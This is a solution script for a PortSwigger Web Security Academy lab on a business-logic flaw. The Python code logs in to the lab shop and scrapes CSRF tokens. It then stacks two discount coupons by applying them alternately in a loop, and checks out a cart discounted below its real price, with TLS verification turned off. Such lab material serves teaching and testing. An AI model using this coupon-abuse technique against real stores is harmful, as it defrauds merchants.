# Lab: Flawed enforcement of business rules

Link to lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules

## Solution

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

sess = requests.Session()

# Get login

response = requests.get('https://0a5f0029049042b0c14185f800d300c9.web-security-academy.net/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]


# Post login
cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    'https://0a5f0029049042b0c14185f800d300c9.web-security-academy.net/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)


# Post item jacket to cart
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

data = {
    'productId': '1',
    'redir': 'PRODUCT',
    'quantity': '1'
}

response = requests.post(
    'https://0a5f0029049042b0c14185f800d300c9.web-security-academy.net/cart',
    cookies=cookies,    
    data=data,
    verify=False,
    allow_redirects=False
)

# Post sign up

data = {
    'csrf': csrf,
    'email/': 'a@a.a',
}

response = requests.post(
    'https://0a5f0029049042b0c14185f800d300c9.web-security-academy.net/sign-up',
    cookies=cookies,
    data=data,
    verify=False,
)

# Get cart

response = requests.get(
    'https://0a5f0029049042b0c14185f800d300c9.web-security-academy.net/cart',
    cookies=cookies,
    verify=False,
    )

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Post coupon 
for i in range(4):
    data = {
        'csrf': csrf,
        'coupon': 'NEWCUST5',
    }

    response = requests.post(
        'https://0a5f0029049042b0c14185f800d300c9.web-security-academy.net/cart/coupon',
        cookies=cookies,
        data=data,
        verify=False,
    )
    data = {
        'csrf': csrf,
        'coupon': 'SIGNUP30',
    }

    response = requests.post(
        'https://0a5f0029049042b0c14185f800d300c9.web-security-academy.net/cart/coupon',
        cookies=cookies,
        data=data,
        verify=False,
    )


# Post payment
data = {
    'csrf': csrf,
}

response = requests.post(
    'https://0a5f0029049042b0c14185f800d300c9.web-security-academy.net/cart/checkout',
    cookies=cookies,
    data=data,
    verify=False,
)
```